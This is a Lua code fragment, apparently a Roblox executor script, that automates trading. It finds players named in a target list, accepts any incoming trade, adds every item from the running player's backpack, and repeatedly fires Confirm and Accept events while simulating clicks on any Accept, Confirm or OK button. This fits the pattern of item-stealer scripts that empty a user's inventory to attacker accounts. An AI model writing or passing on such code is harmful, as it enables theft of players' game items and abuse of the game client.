-- ============ AUTO TRADE (АВТО-ПРИНЯТИЕ ВСЕХ КНОПОК) ============
local function autoTradeLoop()
    local Network
    pcall(function() Network = require(ReplicatedStorage.Shared.Packages.Network) end)
    if not Network then return end
    
    local tradeState = {
        active = false,
        partner = nil,
        partnerId = nil,
        itemsAdded = {},
        confirmed = false,
        completed = false,
        lastTradeTime = 0,
        acceptPressed = false,
        confirmPressed = false
    }
    
    -- Функция поиска партнёра для трейда
    local function findTradePartner()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player then
                for _, target in ipairs(tradeTargets) do
                    if p.Name:lower():find(target:lower()) then
                        return p
                    end
                end
            end
        end
        return nil
    end
    
    -- Функция получения всех предметов для трейда
    local function getTradeItems()
        local items = {}
        if player.Backpack then
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") and item:HasTag("EntityTool") then
                    local guid = item:GetAttribute("GUID")
                    if guid then
                        table.insert(items, {
                            GUID = guid,
                            Name = item.Name,
                            Mutation = item:GetAttribute("Mutation") or "None",
                            Level = item:GetAttribute("Level") or 1
                        })
                    end
                end
            end
        end
        return items
    end
    
    -- Функция для поиска и нажатия кнопок Accept/Confirm в GUI
    local function pressTradeButtons()
        spawn(function()
            while tradeState.active and not tradeState.completed do
                -- Ищем кнопки в интерфейсе трейда
                local playerGui = player:FindFirstChild("PlayerGui")
                if playerGui then
                    -- Поиск всех кнопок Accept
                    for _, obj in ipairs(playerGui:GetDescendants()) do
                        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                            local name = obj.Name:lower()
                            local text = ""
                            pcall(function() text = obj.Text:lower() end)
                            
                            -- Проверяем кнопки Accept и Confirm
                            if name:find("accept") or text:find("accept") or 
                               name:find("confirm") or text:find("confirm") or
                               name:find("ok") or text:find("ok") then
                                
                                if obj.Visible and obj.Active then
                                    -- Нажимаем кнопку
                                    pcall(function()
                                        local x = obj.AbsolutePosition.X + obj.AbsoluteSize.X/2
                                        local y = obj.AbsolutePosition.Y + obj.AbsoluteSize.Y/2
                                        
                                        -- Симуляция клика
                                        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
                                        task.wait(0.05)
                                        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
                                    end)
                                    
                                    -- Также пробуем другие методы активации
                                    pcall(function()
                                        if obj.MouseButton1Click then
                                            obj.MouseButton1Click:Fire()
                                        end
                                    end)
                                    
                                    pcall(function()
                                        if obj.Activated then
                                            for _, bindable in ipairs(obj.Activated:GetBindables()) do
                                                bindable:Fire()
                                            end
                                        end
                                    end)
                                end
                            end
                        end
                    end
                end
                task.wait(0.2) -- Проверяем каждые 200мс
            end
        end)
    end
    
    -- Принятие входящего трейда от любого игрока
    Network.OnClientEvent("trade_n"):Connect(function(userId, time)
        if not isAutoTrade then return end
        
        if acceptAnyTrade then
            local partner = Players:GetPlayerByUserId(userId)
            if partner and partner ~= player then
                tradeState.active = true
                tradeState.partner = partner
                tradeState.partnerId = userId
                tradeState.itemsAdded = {}
                tradeState.confirmed = false
                tradeState.completed = false
                tradeState.acceptPressed = false
                tradeState.confirmPressed = false
                
                -- Сначала принимаем входящий запрос
                pcall(function() Network.FireServer("trade_start", userId) end)
                task.wait(0.3)
                
                -- Запускаем автоматическое нажатие кнопок в GUI
                pressTradeButtons()
                
                -- Добавляем все предметы
                local items = getTradeItems()
                for _, item in ipairs(items) do
                    if item.GUID then
                        pcall(function() Network.FireServer("trade_i", "AddItem", item.GUID) end)
                        table.insert(tradeState.itemsAdded, item)
                        task.wait(0.1)
                    end
                end
                
                -- Нажимаем Confirm
                task.wait(0.3)
                pcall(function() Network.FireServer("trade_i", "Confirm") end)
            end
        end
    end)
    
    -- Обработка статуса трейда
    Network.OnClientEvent("trade_s"):Connect(function(status, ...)
        if not isAutoTrade then return end
        
        if status == "Trading" or status == "Started" then
            tradeState.active = true
            
            -- Постоянно нажимаем Confirm на этапе Trading
            task.wait(0.2)
            pcall(function() Network.FireServer("trade_i", "Confirm") end)
            tradeState.confirmed = true
            
            -- Запускаем авто-нажатие GUI кнопок
            pressTradeButtons()
            
        elseif status == "Completed" then
            tradeState.completed = true
            tradeState.lastTradeTime = tick()
            tradeState.active = false
            
        elseif status == "Cancelled" or status == "Failed" then
            -- Сбрасываем состояние
            tradeState.active = false
            tradeState.partner = nil
            tradeState.partnerId = nil
            tradeState.itemsAdded = {}
            tradeState.confirmed = false
            tradeState.completed = false
            tradeState.acceptPressed = false
            tradeState.confirmPressed = false
        end
    end)
    
    -- Обработка обновлений трейда
    Network.OnClientEvent("trade_u"):Connect(function(data)
        if not isAutoTrade then return end
        if not data then return end
        
        -- На любой стадии трейда - нажимаем Confirm
        if data.Stage == "Trade" or data.Stage == "Process" or data.Stage == "Final" then
            task.wait(0.2)
            pcall(function() Network.FireServer("trade_i", "Confirm") end)
            
            -- Также пробуем нажать Accept если это требуется
            pcall(function() Network.FireServer("trade_i", "Accept") end)
        end
        
        -- Автоматически принимаем все предметы от партнёра
        if data.TradeItems and tradeState.partnerId then
            local theirItems = data.TradeItems[tostring(tradeState.partnerId)]
            if theirItems then
                for guid, itemData in pairs(theirItems) do
                    -- Принимаем каждый предмет
                    pcall(function() Network.FireServer("trade_i", "AcceptItem", guid) end)
                end
            end
        end
        
        -- Если есть подтверждения - проверяем и подтверждаем
        if data.Confirmations then
            local allConfirmed = true
            for userId, confirmed in pairs(data.Confirmations) do
                if not confirmed then 
                    allConfirmed = false
                    break 
                end
            end
            
            -- Если не все подтвердили - подтверждаем мы
            if not allConfirmed then
                task.wait(0.2)
                pcall(function() Network.FireServer("trade_i", "Confirm") end)
            end
            
            -- Если все подтвердили - тоже подтверждаем (для финального этапа)
            if allConfirmed then
                task.wait(0.1)
                pcall(function() Network.FireServer("trade_i", "Confirm") end)
            end
        end
    end)
    
    -- Основной цикл трейда
    while isAutoTrade do
        if not tradeState.active and tick() - tradeState.lastTradeTime > 5 then
            local partner = findTradePartner()
            if partner then
                tradeState.active = true
                tradeState.partner = partner
                tradeState.partnerId = partner.UserId
                tradeState.itemsAdded = {}
                tradeState.confirmed = false
                tradeState.completed = false
                tradeState.acceptPressed = false
                tradeState.confirmPressed = false
                
                -- Отправляем запрос на трейд
                pcall(function() Network.FireServer("trade_r", partner.UserId) end)
                task.wait(1)
                
                -- Запускаем авто-нажатие кнопок
                pressTradeButtons()
                
                -- Добавляем предметы
                local items = getTradeItems()
                for _, item in ipairs(items) do
                    if item.GUID then
                        pcall(function() Network.FireServer("trade_i", "AddItem", item.GUID) end)
                        table.insert(tradeState.itemsAdded, item)
                        task.wait(0.1)
                    end
                end
                
                -- Первое подтверждение
                task.wait(0.5)
                pcall(function() Network.FireServer("trade_i", "Confirm") end)
            end
        end
        
        -- Если трейд активен - постоянно пробуем подтверждать
        if tradeState.active and not tradeState.completed then
            pcall(function() Network.FireServer("trade_i", "Confirm") end)
            pcall(function() Network.FireServer("trade_i", "Accept") end)
        end
        
        if tradeState.completed then
            tradeState.active = false
            tradeState.partner = nil
            tradeState.partnerId = nil
            tradeState.itemsAdded = {}
            tradeState.confirmed = false
            tradeState.completed = false
            tradeState.acceptPressed = false
            tradeState.confirmPressed = false
        end
        
        task.wait(0.3) -- Проверяем часто для быстрого реагирования
    end
end
